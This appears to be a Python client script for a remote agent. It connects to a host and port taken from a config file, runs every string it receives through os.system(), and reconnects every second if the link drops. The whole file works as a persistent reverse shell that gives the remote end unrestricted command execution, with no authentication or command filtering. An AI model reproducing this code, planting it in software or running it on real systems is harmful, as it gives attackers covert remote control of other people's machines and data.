#!/usr/bin/env python

import os
import sys
import time
from socket import socket, AF_INET, SOCK_STREAM
sys.path.insert(0, '..')
sys.dont_write_bytecode = True
try:
    from lib.log import get_logger
    from lib.config import get_config
except:
    raise

LOG = get_logger()
HOST = get_config('../cfg/client.toml')['client']['interface']
PORT = get_config('../cfg/client.toml')['client']['port']


def connect_agent():
    sock = socket(AF_INET, SOCK_STREAM)
    addr = (HOST, PORT)
    LOG.info('Connecting to {} port {}.'.format(str(HOST), str(PORT)))
    sock.connect(addr)
    while True:
        data = sock.recv(1024)
        if not data:
            reconnect_agent()
            continue
        LOG.info('Received {}'.format(data))
        os.system(data)


def reconnect_agent():
    sock = socket(AF_INET, SOCK_STREAM)
    toBreak = False
    while True:
        sock.close()
        try:
            connect_agent()
            toBreak = True
        except KeyboardInterrupt:
            sys.exit()
        except:
            pass
        if toBreak:
            break
        time.sleep(1)

if __name__ == '__main__':
    try:
        reconnect_agent()
    except KeyboardInterrupt:
        sys.exit()
